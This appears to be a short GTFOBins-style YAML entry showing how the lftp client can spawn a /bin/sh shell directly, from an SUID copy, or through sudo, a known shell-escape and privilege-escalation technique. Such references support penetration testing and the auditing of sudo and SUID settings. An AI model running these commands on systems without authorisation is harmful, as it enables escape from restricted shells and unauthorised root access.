---
functions:
  shell:
    - code: lftp -c '!/bin/sh'
  suid-limited:
    - code: ./lftp -c '!/bin/sh'
  sudo:
    - code: sudo lftp -c '!/bin/sh'
---
